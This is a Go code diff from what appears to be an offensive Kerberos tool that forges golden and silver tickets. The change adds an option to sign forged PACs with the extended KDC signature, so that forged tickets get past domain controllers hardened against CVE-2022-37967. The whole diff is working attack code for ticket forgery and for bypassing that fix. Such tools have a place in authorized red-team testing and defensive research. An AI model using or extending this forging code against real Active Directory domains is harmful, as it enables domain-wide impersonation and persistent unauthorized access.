@@ -87,6 +87,9 @@ type ForgeOptions struct {
 	OldPAC bool
 	// ExtraPAC adds a UPN_DNS_INFO buffer (UPN, DNS domain, SAM name and SID).
 	ExtraPAC bool
+	// ExtendedKDCSignature adds the extended KDC signature (0x13), required by a
+	// DC enforcing KrbtgtFullPacSignature (CVE-2022-37967).
+	ExtendedKDCSignature bool
 	// KvNo is the key version number recorded in the ticket enc-part (optional;
 	// omitted when zero).
 	KvNo int
@@ -354,7 +357,7 @@ func buildPACAuthData(opts *ForgeOptions, authTime time.Time) ([]messages.Author
 		return nil, err
 	}
 
-	extras := pac.ForgeExtras{OldPAC: opts.OldPAC}
+	extras := pac.ForgeExtras{OldPAC: opts.OldPAC, ExtendedKDCSignature: opts.ExtendedKDCSignature}
 	if opts.ExtraPAC {
 		extras.UPNDNS = &pac.UPNDNSInfo{
 			UPN:           strings.ToLower(opts.Username) + "@" + strings.ToLower(opts.Realm),
@@ -370,6 +373,15 @@ func buildPACAuthData(opts *ForgeOptions, authTime time.Time) ([]messages.Author
 	// Golden: krbtgt is both the ticket server and the privsvr, so both PAC
 	// signatures use the krbtgt key. Silver: the service key signs both (the KDC
 	// signature is never verified by the service). Either way opts.Key signs both.
+	if opts.ExtendedKDCSignature {
+		// The extended KDC signature is generated before the server signature,
+		// which then covers it ([MS-PAC] 2.8.3). Golden signs both with the
+		// krbtgt key; silver with the service key, which is never verified by a
+		// KDC but keeps the PAC self-consistent.
+		if err := p.SignExtendedKDCSignature(opts.Key); err != nil {
+			return nil, fmt.Errorf("kerberos: sign extended KDC PAC signature: %w", err)
+		}
+	}
 	pacBytes, err := p.Sign(opts.Key, opts.Key)
 	if err != nil {
 		return nil, fmt.Errorf("kerberos: sign PAC: %w", err)
